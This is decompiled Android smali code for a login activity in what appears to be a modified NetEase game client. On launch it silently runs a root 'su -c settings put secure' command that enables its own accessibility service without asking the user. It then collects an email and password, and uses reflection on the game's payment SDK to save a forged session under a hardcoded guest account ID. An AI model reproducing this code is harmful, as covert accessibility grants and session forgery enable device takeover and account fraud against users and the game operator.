.class public Lcom/netease/chiji/EmailAuthActivity;
.super Landroid/app/Activity;
.source "EmailAuthActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/netease/chiji/EmailAuthActivity$LoginClickListener;,
        Lcom/netease/chiji/EmailAuthActivity$LoginNetworkTask;,
        Lcom/netease/chiji/EmailAuthActivity$SessionSaveRunnable;,
        Lcom/netease/chiji/EmailAuthActivity$FailureRunnable;,
        Lcom/netease/chiji/EmailAuthActivity$SuccessRunnable;
    }
.end annotation


# static fields
.field private static final AUTH_URL:Ljava/lang/String; = "https://sdk-os.mpsdk.easebar.com/custom/auth/login"

.field private static final GAME_ACCOUNT_UID:Ljava/lang/String; = "guest_11178811c6a412d9"

.field private static final GAME_CONFIG_POLL_INTERVAL_MS:I = 0xc8

.field private static final GAME_CONFIG_POLL_TIMEOUT_MS:I = 0x1f40


# direct methods
.method public constructor <init>()V
    .registers 1

    .line 45
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private ensureAccessibilityServiceEnabled()V
    .registers 5

    .line 67
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "su"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "-c"

    const/4 v3, 0x1

    aput-object v2, v1, v3

    const-string v2, "settings put secure enabled_accessibility_services com.netease.chiji/com.netease.chiji.MpayWatcherService && settings put secure accessibility_enabled 1"

    const/4 v3, 0x2

    aput-object v2, v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 70
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_1d} :catch_1e

    .line 75
    goto :goto_1f

    .line 71
    :catch_1e
    move-exception v0

    .line 76
    :goto_1f
    return-void
.end method


# virtual methods
.method doLogin(Ljava/lang/String;Ljava/lang/String;)V
    .registers 5

    .line 131
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/netease/chiji/EmailAuthActivity$LoginNetworkTask;

    invoke-direct {v1, p0, p1, p2}, Lcom/netease/chiji/EmailAuthActivity$LoginNetworkTask;-><init>(Lcom/netease/chiji/EmailAuthActivity;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 132
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2

    .line 51
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 52
    invoke-direct {p0}, Lcom/netease/chiji/EmailAuthActivity;->ensureAccessibilityServiceEnabled()V

    .line 53
    const/4 p1, 0x0

    invoke-virtual {p0, p1}, Lcom/netease/chiji/EmailAuthActivity;->showLoginDialog(Ljava/lang/String;)V

    .line 54
    return-void
.end method

.method onLoginSuccess(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .registers 6

    .line 161
    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    .line 162
    const-string v0, "com.netease.neox.Launcher"

    invoke-virtual {p1, p0, v0}, Landroid/content/Intent;->setClassName(Landroid/content/Context;Ljava/lang/String;)Landroid/content/Intent;

    .line 163
    invoke-virtual {p0, p1}, Lcom/netease/chiji/EmailAuthActivity;->startActivity(Landroid/content/Intent;)V

    .line 165
    new-instance p1, Landroid/os/Handler;

    invoke-virtual {p0}, Lcom/netease/chiji/EmailAuthActivity;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {p1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v0, Lcom/netease/chiji/EmailAuthActivity$SessionSaveRunnable;

    const/4 v1, 0x0

    invoke-direct {v0, p0, p2, p3, v1}, Lcom/netease/chiji/EmailAuthActivity$SessionSaveRunnable;-><init>(Lcom/netease/chiji/EmailAuthActivity;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {p1, v0}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 167
    return-void
.end method

.method showLoginDialog(Ljava/lang/String;)V
    .registers 9

    .line 79
    const-string v0, "sans-serif-condensed"

    const/4 v1, 0x1

    invoke-static {v0, v1}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    move-result-object v2

    .line 80
    const/4 v3, 0x0

    invoke-static {v0, v3}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    move-result-object v0

    .line 82
    new-instance v4, Landroid/widget/LinearLayout;

    invoke-direct {v4, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 83
    invoke-virtual {v4, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 84
    invoke-virtual {p0}, Lcom/netease/chiji/EmailAuthActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v1

    iget v1, v1, Landroid/util/DisplayMetrics;->density:F

    const/high16 v5, 0x41800000    # 16.0f

    mul-float v1, v1, v5

    float-to-int v1, v1

    .line 85
    invoke-virtual {v4, v1, v1, v1, v1}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 87
    if-eqz p1, :cond_3b

    .line 88
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 89
    invoke-virtual {v1, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 90
    const/high16 p1, -0x10000

    invoke-virtual {v1, p1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 91
    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 92
    invoke-virtual {v4, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 95
    :cond_3b
    new-instance p1, Landroid/widget/EditText;

    invoke-direct {p1, p0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    .line 96
    const-string v1, "Email"

    invoke-virtual {p1, v1}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 97
    invoke-virtual {p1, v0}, Landroid/widget/EditText;->setTypeface(Landroid/graphics/Typeface;)V

    .line 98
    const/16 v1, 0x21

    invoke-virtual {p1, v1}, Landroid/widget/EditText;->setInputType(I)V

    .line 99
    invoke-virtual {v4, p1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 101
    new-instance v1, Landroid/widget/EditText;

    invoke-direct {v1, p0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    .line 102
    const-string v5, "Password"

    invoke-virtual {v1, v5}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 103
    invoke-virtual {v1, v0}, Landroid/widget/EditText;->setTypeface(Landroid/graphics/Typeface;)V

    .line 104
    const/16 v5, 0x81

    invoke-virtual {v1, v5}, Landroid/widget/EditText;->setInputType(I)V

    .line 105
    invoke-virtual {v4, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 107
    new-instance v5, Landroid/app/AlertDialog$Builder;

    invoke-direct {v5, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 108
    const-string v6, "Sign in"

    invoke-virtual {v5, v6}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 109
    const-string v6, "Enter your pre-registered email and password. A new account is created automatically on first login."

    invoke-virtual {v5, v6}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 110
    invoke-virtual {v5, v4}, Landroid/app/AlertDialog$Builder;->setView(Landroid/view/View;)Landroid/app/AlertDialog$Builder;

    .line 111
    invoke-virtual {v5, v3}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    .line 112
    const-string v3, "Login"

    const/4 v4, 0x0

    invoke-virtual {v5, v3, v4}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 113
    invoke-virtual {v5}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v3

    .line 114
    invoke-virtual {v3}, Landroid/app/AlertDialog;->show()V

    .line 116
    const v4, 0x1020016

    invoke-virtual {v3, v4}, Landroid/app/AlertDialog;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    .line 117
    if-eqz v4, :cond_95

    .line 118
    invoke-virtual {v4, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 120
    :cond_95
    const v4, 0x102000b

    invoke-virtual {v3, v4}, Landroid/app/AlertDialog;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    .line 121
    if-eqz v4, :cond_a3

    .line 122
    invoke-virtual {v4, v0}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 124
    :cond_a3
    const/4 v0, -0x1

    invoke-virtual {v3, v0}, Landroid/app/AlertDialog;->getButton(I)Landroid/widget/Button;

    move-result-object v4

    invoke-virtual {v4, v2}, Landroid/widget/Button;->setTypeface(Landroid/graphics/Typeface;)V

    .line 126
    invoke-virtual {v3, v0}, Landroid/app/AlertDialog;->getButton(I)Landroid/widget/Button;

    move-result-object v0

    new-instance v2, Lcom/netease/chiji/EmailAuthActivity$LoginClickListener;

    invoke-direct {v2, p0, p1, v1, v3}, Lcom/netease/chiji/EmailAuthActivity$LoginClickListener;-><init>(Lcom/netease/chiji/EmailAuthActivity;Landroid/widget/EditText;Landroid/widget/EditText;Landroid/app/AlertDialog;)V

    invoke-virtual {v0, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 128
    return-void
.end method

.method trySaveSession(Ljava/lang/String;Ljava/lang/String;I)V
    .registers 24

    .line 171
    move-object/from16 v1, p0

    move-object/from16 v0, p1

    move-object/from16 v2, p2

    move/from16 v3, p3

    const-string v4, ""

    const-string v5, "b"

    const-string v6, "a"

    :try_start_e
    const-string v7, "com.netease.mpay.oversea.g.c"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v7

    .line 172
    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    invoke-virtual {v7, v5, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v11, 0x0

    invoke-virtual {v9, v11, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    .line 173
    const-string v10, "q"

    new-array v12, v8, [Ljava/lang/Class;

    invoke-virtual {v7, v10, v12}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    new-array v10, v8, [Ljava/lang/Object;

    invoke-virtual {v7, v9, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    .line 175
    if-eqz v7, :cond_3a

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v9

    if-nez v9, :cond_54

    :cond_3a
    const/16 v9, 0x1f40

    if-ge v3, v9, :cond_54

    .line 176
    new-instance v4, Landroid/os/Handler;

    invoke-virtual/range {p0 .. p0}, Lcom/netease/chiji/EmailAuthActivity;->getMainLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v5, Lcom/netease/chiji/EmailAuthActivity$SessionSaveRunnable;

    add-int/lit16 v3, v3, 0xc8

    invoke-direct {v5, v1, v0, v2, v3}, Lcom/netease/chiji/EmailAuthActivity$SessionSaveRunnable;-><init>(Lcom/netease/chiji/EmailAuthActivity;Ljava/lang/String;Ljava/lang/String;I)V

    const-wide/16 v2, 0xc8

    invoke-virtual {v4, v5, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 179
    return-void

    .line 184
    :cond_54
    const-string v3, "com.netease.mpay.oversea.j.a.g"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    .line 185
    const-string v9, "c"

    invoke-virtual {v3, v9}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v9

    invoke-virtual {v9, v11}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    .line 187
    const-string v10, "com.netease.mpay.oversea.j.a.f$a"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    .line 188
    const/16 v11, 0x8

    new-array v12, v11, [Ljava/lang/Class;

    const-class v13, Ljava/lang/String;

    aput-object v13, v12, v8

    const-class v13, Ljava/lang/String;

    const/4 v14, 0x1

    aput-object v13, v12, v14

    const-class v13, Ljava/lang/String;

    const/4 v15, 0x2

    aput-object v13, v12, v15

    const-class v13, Ljava/lang/String;

    const/16 v16, 0x3

    aput-object v13, v12, v16

    const/4 v13, 0x4

    aput-object v3, v12, v13

    const-class v3, Ljava/lang/String;

    const/16 v17, 0x5

    aput-object v3, v12, v17

    const-class v3, Ljava/util/ArrayList;

    const/16 v18, 0x6

    aput-object v3, v12, v18

    const-class v3, Ljava/lang/Boolean;

    const/16 v19, 0x7

    aput-object v3, v12, v19

    invoke-virtual {v10, v12}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v3

    .line 191
    new-array v11, v11, [Ljava/lang/Object;

    const-string v12, "guest_11178811c6a412d9"

    aput-object v12, v11, v8

    aput-object v0, v11, v14

    aput-object v4, v11, v15

    aput-object v4, v11, v16

    aput-object v9, v11, v13

    aput-object v2, v11, v17

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    aput-object v0, v11, v18

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    aput-object v0, v11, v19

    invoke-virtual {v3, v11}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    .line 193
    new-array v2, v8, [Ljava/lang/Class;

    invoke-virtual {v10, v6, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 194
    new-array v3, v8, [Ljava/lang/Object;

    invoke-virtual {v2, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    .line 195
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    .line 197
    const-string v0, "com.netease.mpay.oversea.j.b"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 198
    new-array v4, v15, [Ljava/lang/Class;

    const-class v9, Landroid/content/Context;

    aput-object v9, v4, v8

    const-class v9, Ljava/lang/String;

    aput-object v9, v4, v14

    invoke-virtual {v0, v4}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v4

    .line 199
    new-array v9, v15, [Ljava/lang/Object;

    aput-object v1, v9, v8

    aput-object v7, v9, v14

    invoke-virtual {v4, v9}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    .line 201
    new-array v7, v8, [Ljava/lang/Class;

    invoke-virtual {v0, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    new-array v7, v8, [Ljava/lang/Object;

    invoke-virtual {v0, v4, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4
    :try_end_f4
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_f4} :catch_119

    .line 204
    :try_start_f4
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    new-array v7, v14, [Ljava/lang/Class;

    aput-object v3, v7, v8

    invoke-virtual {v0, v5, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0
    :try_end_100
    .catch Ljava/lang/NoSuchMethodException; {:try_start_f4 .. :try_end_100} :catch_101
    .catch Ljava/lang/Exception; {:try_start_f4 .. :try_end_100} :catch_119

    .line 207
    goto :goto_10e

    .line 205
    :catch_101
    move-exception v0

    .line 206
    :try_start_102
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    new-array v5, v14, [Ljava/lang/Class;

    aput-object v3, v5, v8

    invoke-virtual {v0, v6, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 208
    :goto_10e
    new-array v3, v14, [Ljava/lang/Object;

    aput-object v2, v3, v8

    invoke-virtual {v0, v4, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 210
    invoke-virtual/range {p0 .. p0}, Lcom/netease/chiji/EmailAuthActivity;->finish()V
    :try_end_118
    .catch Ljava/lang/Exception; {:try_start_102 .. :try_end_118} :catch_119

    .line 216
    goto :goto_11d

    .line 211
    :catch_119
    move-exception v0

    .line 215
    invoke-virtual/range {p0 .. p0}, Lcom/netease/chiji/EmailAuthActivity;->finish()V

    .line 217
    :goto_11d
    return-void
.end method
